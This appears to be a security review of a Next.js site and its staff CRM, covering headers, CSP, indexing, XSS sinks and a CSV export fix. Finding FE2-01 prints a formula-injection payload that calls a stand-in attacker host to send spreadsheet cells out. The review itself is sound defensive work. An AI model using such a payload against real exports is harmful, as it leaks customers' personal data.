# sec2-frontend: round 2, browser-facing security (WHT, SVT, /crm)

Local only. No production access, no secrets read, no dev server, no deploy. Built on `parts/sec-frontend.md` and `12-final-devils-advocate-review.md`; items they covered (FE-01 to FE-11) are not repeated. Tests: `src/lib/__tests__/round2-frontend-security.test.ts` (28 tests). I also ran the effective header merge (next.config.js `headers()` + vercel.json, later rule wins per key) for sample URLs on both hosts.

## Findings

| ID | Severity | Status | Title | Evidence |
|---|---|---|---|---|
| FE2-01 | Medium | Confirmed, fixed | CSV formula injection in CRM client export and partner export | `DashboardClient.tsx` ~2222 and `PartnersClient.tsx` ~89 (old); public name field only strips tags (`src/lib/sanitise.ts:9`) |
| FE2-02 | Info | Confirmed | Header merge as emitted: all baseline headers present on every WHT/SVT URL; one gap below | headers simulation, test group FE2-02 |
| FE2-03 | Low | Confirmed, fixed | /crm noindex was client-side JS only; /api had none | `crm/layout.tsx:81`, `src/app/robots.ts` |
| FE2-04 | Info | Confirmed, pinned | XSS sinks across six WHT language groups and three SVT groups: none exploitable | tests FE2-04 |
| FE2-05 | Low | Confirmed, fixed | `/((?!crm).*)` excluded `/crmx`, `/crm-anything` from every security header | `next.config.js` old line 135 |
| FE2-06 | Info | Confirmed, fixed | `X-Powered-By: Next.js` advertised | next.config.js |
| FE2-07 | Info | Confirmed | Suspected conflict: route-level CSP (sandbox) vs config CSP on `/api/crm/file` and `/api/will/media/[id]` | see below |
| FE2-08 | Low | Confirmed, proposal | GA loads on WHT questionnaire pages (SVT excludes them) | `RootDocument.tsx:354`, `SvtDocument.tsx:27`; `proposals/ga-off-form-pages/` |
| FE2-09 | Low | Confirmed, proposal | CSP: unused origins usable as exfil channel on public pages and on /crm | `proposals/csp-enforcement/PLAN.md` |
| FE2-10 | Low | Confirmed | robots.txt publishes the hidden residency slug `/y8vwp4bf7` (and de/ja/fr/it/es) | `src/app/robots.ts:24-29` |
| FE2-11 | Info | Confirmed | Staff browser caches WhatsApp media for 1 h (`private, max-age=3600`) after logout; `/api/crm/file` is no-store | `src/app/api/will/media/[id]/route.ts:58` |
| FE2-12 | Info | Confirmed | `crm_session` has no `__Host-` prefix | `verify-otp/route.ts:81` |
| FE2-13 | Info | Confirmed | HSTS decision memo | `proposals/hsts-decision/MEMO.md` |

### FE2-01 (fixed)
Attack path: a stranger submits the public form with full name `=HYPERLINK("https://evil.example/?"&E2,"x")` (or notes, email, "how heard"). Jo clicks the client export in /crm and opens the CSV in Excel or Sheets; the formula runs and can send neighbouring cells (email, DOB, WhatsApp) to the attacker, or trigger a DDE prompt. The leads export already had a guard; the two client-side exports did not (partners did not even escape quotes, so a quote in a name broke the file). Fix: `src/lib/csv.ts` (`csvCell`, `csvRow`), used by all three exports; numbers pass through unchanged. Test: hostile cells for `= + - @ TAB CR`, quote doubling, negative numbers kept numeric, and a scan that every `text/csv` producer imports the shared encoder. Residual: a WhatsApp number now shows with a leading apostrophe in Excel (same as the existing leads export). Open work: the CSV is produced in the browser, so only this guard protects it.

### FE2-02 emitted headers (what I verified)
WHT public, `/api/*`, `/crm*`, SVT hosts (apex, www, and both with a trailing dot after sec2-forms-uploads' host fix) all carry nosniff, X-Frame-Options DENY, Referrer-Policy, HSTS, Permissions-Policy, COOP, CORP. Clickjacking: `X-Frame-Options: DENY` plus `frame-ancestors 'none'` on public, SVT and (via the proxy nonce CSP) /crm; on /crm under `CSP_NONCE_DISABLED` the static CSP returns. CORS: no `Access-Control-*` header exists anywhere (tested), so the browser same-origin default holds. Cookies: the three CRM cookies are httpOnly, SameSite strict, secure in production, path /, bounded maxAge (tested). Cache-Control: `/api/*` no-store via vercel.json only (not in next.config.js, so a non-Vercel host would lose it, but all route handlers are dynamic by default and a test pins no `force-static`/`s-maxage` in routes). /crm pages are dynamic (cookies() or force-dynamic); now also explicit `private, no-store`.
CSP gap noticed: none for headers on SVT. The proxy runs before rewrites, so an SVT `/crm` request gets the nonce CSP from the proxy; the SVT 404 body has no scripts, so no effect.

### FE2-03, FE2-05, FE2-06 (fixed in `next.config.js`)
`X-Robots-Tag: noindex, nofollow, noarchive, nosnippet` on `/crm`, `/crm/:path*`, `/api/:path*`; `Cache-Control: private, no-store, max-age=0` on `/crm`; `NOT_CRM = '/((?!crm(?:/|$)).*)'`; `poweredByHeader: false`. The two existing tests that pinned the old regex string were updated. Hidden pages: every questionnaire route (WHT en/de/ja, SVT en/zh/vi) has `index:false` in page or layout metadata (tested); they are deliberately not in robots.txt so the crawler can read noindex.

### FE2-04 sinks
All `dangerouslySetInnerHTML` uses are JSON-LD, constant CSS, or the sanitised guide renderer (`render-inline.ts`); test fails on any new use. No innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, new Function, srcdoc anywhere in src. URL parameters are read only for `ref` (posted as data, rendered as text in CRM), `timeout=1`, `utm_source` (compared against a fixed list). No JSON-LD file reads URL, query, headers or cookies. All locale blog routes call `notFound()` for unknown slugs through shared components, SVT uses `dynamicParams=false`. `window.location` writes are constant paths or `/crm/partners/<db id>`. The CRM renders customer text as React text; attachments use same-origin proxy routes with `nosniff`, a sandbox CSP and inline only for raster/PDF.

### FE2-07 (suspected, unverifiable locally)
`/api/crm/file` and `/api/will/media/[id]` set `Content-Security-Policy: sandbox; default-src 'none'`, while next.config.js also attaches the public CSP to `/api/*`. Whether Vercel replaces the route's header, keeps it, or emits both (intersection, sandbox still applies) I could not observe. Worst case is the sandbox is replaced by the public CSP on an inline PDF/image response, which only matters for a hostile PDF in the browser PDF viewer (types are restricted to raster images and PDF, SVG/HTML are rejected or downloaded). Check with `curl -I` on a Preview after login. Cheap mitigation if the sandbox is lost: exclude those two paths from `NOT_CRM`.

### FE2-08, FE2-09, FE2-13
See proposals. FE2-08: the same Google script that SVT keeps away from the form runs on the WHT TFN form. FE2-09: `*.supabase.co` in connect-src and img-src, resend, facebook and Google Fonts are allowed on public pages and /crm though unused (verified: no browser Supabase client, fonts self-hosted); hash-based CSP is not workable for static Next pages, so the plan keeps `'unsafe-inline'`, tightens everything else through Report-Only, and proposes a nonce policy for the PII form routes only.

### Third parties and data exposure
GA4 (WHT and SVT each own property): sends page URL incl. query (`?ref=` partner code, utm), referrer, user agent, derived location, plus the custom events in `src/lib/analytics.ts` (cta position, topic, language, tier, `ai_source`), no names, emails or form values. No Meta pixel. Facebook SDK only on `/crm/whatsapp/connect` (nonce-loaded, no SRI possible for a mutable SDK; it executes in the CRM origin, so keep it on that one page). YouTube embeds use `www.youtube.com` not the nocookie host, which sets Google cookies on medicare pages (privacy, not security; `youtube-nocookie.com` is already allowed by CSP). SRI: no third-party `<script integrity>` is possible for gtag or the FB SDK (they change); first-party chunks are same-origin.
Storage: `sessionStorage` form snapshot (name, DOB, address, email, phone; no TFN, no files; test pins it), `wht_ai_source`, `localStorage` banner flag and CRM activity timestamp. No service worker, no source maps (`productionBrowserSourceMaps` unset, none in public), no postMessage sender, one receiver with a strict origin check.

## Not assessed
Live response headers from Vercel (it can add or override), DNS and subdomain inventory, hstspreload.org status, GA4 property settings (Google Signals, data retention, enhanced measurement form events), real-browser CSP behaviour, git history, dashboards. No `next build` was run (memory), so no emitted-HTML inspection.

## Tests run
`npx jest` on round2-frontend-security, csp-report-only, brand-routing-26oct, frontend-security: passed before the last DashboardClient syntax correction. Final tsc and eslint results: see the closing note in the chat reply.
